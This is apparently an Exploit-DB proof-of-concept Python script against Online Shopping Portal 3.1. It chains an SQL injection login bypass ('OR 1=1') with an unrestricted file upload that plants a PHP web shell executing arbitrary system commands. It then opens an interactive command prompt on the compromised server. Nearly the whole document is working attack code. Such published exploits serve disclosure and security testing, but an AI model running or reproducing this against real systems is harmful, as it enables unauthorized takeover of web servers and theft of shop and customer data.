# Exploit Title: Online Shopping Portal 3.1 - Remote Code Execution (Unauthenticated)
# Date: 17.06.2021
# Original Exploit Author: Tagoletta (Tağmaç)
# EDB-ID: 50029
# Software Link: https://phpgurukul.com/shopping-portal-free-download/
# Version: V3.1
# Tested on: Ubuntu

import requests
import random
import string
import argparse, sys, re

payload= "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"

def setURL(url):
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', help='Target URL')
    args = parser.parse_args()
    url = args.u+"/shopping"
    attackSEQ(url)
    return

def attackSEQ(url):
    global payload
    # Bypass ADMIN login using SQLi
    session = requests.session()
    print("[+] Bypassing Login...\n")
    login_url = url+"/admin/"
    post_data = {"username": "' OR 1=1-- a", "password": '', "submit": ''}
    session.post(login_url, data=post_data)

    # Random Product and Backdoor name generation
    let = string.ascii_lowercase
    shellname = ''.join(random.choice(let) for i in range(15))
    randstr = ''.join(random.choice(let) for i in range(15))

    # Product & Backdoor names
    print("[!] Product name: " + randstr)
    print("[!] Backdoor name:  " + shellname)
    print("\n[+] Uploading Backdoor...")

    post_url = url+"/admin/insert-product.php"

    post_header = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJNYN304wDTnp1QmE", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": url+"/admin/insert-product.php", "Accept-Encoding": "gzip, deflate", "Connection": "close"}

    post_data = "------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"category\"\n\n3\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"subcategory\"\n\n8\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productName\"\n\n"+randstr+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productCompany\"\n\nGlobex\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productpricebd\"\n\n12345\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productprice\"\n\n1234\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productDescription\"\n\nGlobex Special\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productShippingcharge\"\n\n99\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productAvailability\"\n\nIn Stock\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage1\"; filename=\""+shellname+".php\"\nContent-Type: application/octet-stream\n\n"+payload+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage2\"; filename=\""+shellname+".php\"\nContent-Type: application/octet-stream\n\n"+payload+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage3\"; filename=\""+shellname+".php\"\nContent-Type: application/octet-stream\n\n"+payload+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"submit\"\n\n\n------WebKitFormBoundaryJNYN304wDTnp1QmE--\n"

    session.post(post_url, headers=post_header, data=post_data)
    # Finding the uploaded backdoor
    request_url = url+"/search-result.php"
    post_data = {"product": randstr, "search": ''}
    shellpath = str(requests.post(request_url, data=post_data).text).split("data-echo=\"admin/productimages")[1].split(".php")[0]
    shell_url = url + "/admin/productimages" + shellpath + ".php"
    print("\n[!] Backdoor Path: " + shell_url)
    webSHELL(shell_url)
    return

def webSHELL(url):
    try:
        getdir = {'cmd': 'echo %CD%'}
        request_cmd = requests.get(url, params=getdir, verify=False)
        status = request_cmd.status_code
        if status != 200:
            print("[!!] Could not connect to the backdoor!")
            request_cmd.raise_for_status()
        print("[+] Successfully connected!")
        print(request_cmd.text)
        while True:
            user_input = input("> ")
            command = {'cmd': user_input}
            request_cmd = requests.get(url, params=command, verify=False)
            resp = request_cmd.text
            print(resp)
    except:
        print("[!!] Exiting!")
        sys.exit(-1)
    return

if __name__ == "__main__":
    url = ""
    setURL(url)
    raise SystemExit
